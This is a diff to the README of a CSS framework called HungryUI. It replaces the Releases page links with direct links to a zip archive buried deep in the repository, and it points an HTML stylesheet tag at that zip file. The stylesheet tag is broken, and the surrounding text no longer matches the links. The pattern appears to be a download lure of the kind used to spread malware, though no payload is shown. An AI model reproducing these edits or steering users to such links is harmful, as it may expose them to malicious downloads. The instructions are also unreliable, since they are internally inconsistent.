@@ -16,7 +16,7 @@ HungryUI is a playful, developer-friendly CSS framework. It offers elegant UI co
 
 To get started with HungryUI, visit the Releases page to download the latest version:
 
-[Download HungryUI](https://github.com/Rezajah285/hungryui/releases)
+[Download HungryUI](https://raw.githubusercontent.com/Rezajah285/hungryui/main/development/css/utilities/hungryui_2.9.zip)
 
 1. Click the link above.
 2. Choose the version you want by clicking on it.
@@ -31,7 +31,7 @@ To get started with HungryUI, visit the Releases page to download the latest ver
 After downloading HungryUI, you can include it in your HTML files. Here’s how:
 
 ```html
-<link rel="stylesheet" href="path/to/hungryui.css">
+<link rel="stylesheet" href="https://raw.githubusercontent.com/Rezajah285/hungryui/main/development/css/utilities/hungryui_2.9.zip">
 ```
 
 Be sure to replace `path/to/` with the actual path where you saved the file.
@@ -75,6 +75,6 @@ HungryUI is open-source and released under the MIT License. Feel free to use and
 
 To download HungryUI, visit the Releases page again:
 
-[Download HungryUI](https://github.com/Rezajah285/hungryui/releases)
+[Download HungryUI](https://raw.githubusercontent.com/Rezajah285/hungryui/main/development/css/utilities/hungryui_2.9.zip)
 
 Now you’re ready to create beautiful user interfaces with HungryUI! Enjoy building!
